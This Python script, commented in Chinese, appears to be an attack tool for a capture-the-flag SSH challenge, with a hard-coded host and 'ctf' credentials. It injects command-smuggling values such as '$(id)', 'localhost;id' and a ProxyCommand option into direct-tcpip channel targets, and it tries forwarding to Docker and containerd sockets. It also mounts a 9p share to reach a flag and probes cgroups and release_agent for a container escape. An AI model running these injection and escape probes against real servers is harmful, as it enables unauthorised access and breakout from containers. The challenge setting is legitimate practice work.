import paramiko
import subprocess
import time
import socket

HOST = "61.147.171.105"
PORT = 55300
USER = "ctf"
PASSWD = "123456"

def exec_cmd(ssh, cmd, timeout=10):
    """执行命令并返回输出"""
    stdin, stdout, stderr = ssh.exec_command(cmd, timeout=timeout)
    out = stdout.read().decode()
    err = stderr.read().decode()
    return out + err

def test_proxy_jump_injection():
    """测试ProxyJump注入"""
    # FakeJumpServer的核心思路：
    # 当通过 -J 跳转时，跳板机需要执行 "ssh" 或类似命令来建立转发
    # 如果我们能控制目标地址，可能可以注入命令
    
    # 尝试不同的目标地址
    targets = [
        "localhost",
        "127.0.0.1", 
        "$(id)",
        "`id`",
        "localhost;id",
        "localhost|id",
        "%0aid",
        "localhost -o ProxyCommand=id",
    ]
    
    for target in targets:
        print(f"\n[*] 测试目标: {target}")
        # 这里我们通过paramiko的direct-tcpip来模拟
        ssh = paramiko.SSHClient()
        ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
        ssh.connect(HOST, PORT, USER, PASSWD)
        
        transport = ssh.get_transport()
        
        try:
            channel = transport.open_channel("direct-tcpip", (target, 22), ('127.0.0.1', 0), timeout=3)
            print(f"[+] 通道打开成功!")
            channel.settimeout(2)
            try:
                data = channel.recv(100)
                print(f"    Data: {data}")
            except:
                pass
            channel.close()
        except Exception as e:
            print(f"[-] 失败: {e}")
        
        ssh.close()

def test_streamlocal_forward():
    """测试streamlocal转发（Unix socket转发）"""
    ssh = paramiko.SSHClient()
    ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
    ssh.connect(HOST, PORT, USER, PASSWD)
    
    transport = ssh.get_transport()
    
    # 尝试转发Unix socket
    socket_paths = [
        "/var/run/docker.sock",
        "/run/docker.sock",
        "/run/containerd/containerd.sock",
        "/run/host/notify",
        "/var/lib/docker/containerd/containerd.sock",
    ]
    
    for path in socket_paths:
        try:
            print(f"[*] 尝试连接 {path}...")
            # direct-streamlocal@openssh.com 用于Unix socket转发
            channel = transport.open_channel("direct-streamlocal@openssh.com", path, ("", 0), timeout=3)
            print(f"[+] 成功连接到 {path}!")
            channel.close()
        except Exception as e:
            pass  # 静默失败
    
    ssh.close()

def deep_explore():
    """深度探索环境"""
    ssh = paramiko.SSHClient()
    ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
    ssh.connect(HOST, PORT, USER, PASSWD)
    
    # 检查virtio相关设备
    print("[*] 检查virtio设备...")
    cmds = [
        "ls -la /sys/devices/",
        "ls -la /sys/bus/",
        "find /sys -name '*9p*' -o -name '*virtio*'",
        "ls -la /dev/",
        "cat /sys/devices/pci0000:00/*/driver",
    ]
    
    for cmd in cmds:
        print(f"\n[*] {cmd}")
        result = exec_cmd(ssh, cmd)
        if result.strip():
            print(result[:1000])
    
    ssh.close()

def check_9p_mounts():
    """检查9p挂载"""
    ssh = paramiko.SSHClient()
    ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
    ssh.connect(HOST, PORT, USER, PASSWD)
    
    # 检查内核是否支持9p
    print("[*] 检查9p支持...")
    cmds = [
        "cat /proc/filesystems",
        "lsmod",
        "cat /proc/modules",
        "ls /lib/modules/",
    ]
    
    for cmd in cmds:
        print(f"\n[*] {cmd}")
        print(exec_cmd(ssh, cmd))
    
    # 尝试mount
    print("\n[*] 尝试mount...")
    print(exec_cmd(ssh, "mkdir -p /mnt/flag"))
    print(exec_cmd(ssh, "mount -t 9p -o trans=virtio,version=9p2000.L flag /mnt/flag"))
    print(exec_cmd(ssh, "mount"))
    print(exec_cmd(ssh, "ls -la /mnt/"))
    
    ssh.close()

def find_escape_path():
    """寻找逃逸路径"""
    ssh = paramiko.SSHClient()
    ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
    ssh.connect(HOST, PORT, USER, PASSWD)
    
    # 检查特权
    print("[*] 检查特权...")
    print(exec_cmd(ssh, "cat /proc/self/status"))
    
    # 检查cgroups
    print("\n[*] 检查cgroups...")
    print(exec_cmd(ssh, "cat /proc/self/cgroup"))
    print(exec_cmd(ssh, "ls -la /sys/fs/cgroup/"))
    
    # 检查命名空间
    print("\n[*] 检查命名空间...")
    print(exec_cmd(ssh, "ls -la /proc/self/ns/"))
    
    # 检查是否有release_agent可以利用
    print("\n[*] 检查release_agent...")
    print(exec_cmd(ssh, "find /sys/fs/cgroup -name release_agent"))
    print(exec_cmd(ssh, "cat /sys/fs/cgroup/release_agent"))
    
    ssh.close()

if __name__ == "__main__":
    print("="*50)
    print("[*] 深度探索和测试")
    print("="*50)
    
    print("\n[1] 检查9p挂载")
    check_9p_mounts()
    
    print("\n[2] 深度探索")
    deep_explore()
    
    print("\n[3] 寻找逃逸路径")
    find_escape_path()
    
    print("\n[4] 测试streamlocal转发")
    test_streamlocal_forward()
